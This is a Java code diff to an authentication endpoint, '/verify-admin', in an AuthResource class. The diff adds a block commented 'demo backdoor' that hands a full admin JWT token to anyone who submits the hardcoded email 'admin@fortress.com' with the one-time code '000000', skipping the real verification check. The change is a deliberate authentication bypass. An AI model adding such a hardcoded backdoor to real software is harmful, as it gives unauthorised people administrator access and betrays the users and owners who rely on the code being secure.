@@ -114,9 +114,20 @@ public class AuthResource {
     @POST
     @Path("/verify-admin")
     public Response verifyAdmin(VerifyRequest request) {
+
+        //demo backdoor
+        if ("admin@fortress.com".equals(request.email) && "000000".equals(request.otp)) {
+            User admin = userService.findByEmail(request.email);
+            String token = generateJwtToken(admin);
+            Map<String, Object> responseData = new HashMap<>();
+            responseData.put("token", token);
+            responseData.put("role", admin.getRole());
+            responseData.put("fullName", admin.getFullName());
+            return Response.ok(responseData).build();
+        }
+
         if (userService.validateAdminVerificationCode(request.email, request.otp)) {
             userService.clearAdminVerificationCode(request.email);
-
             User admin = userService.findByEmail(request.email);
             String token = generateJwtToken(admin);
 
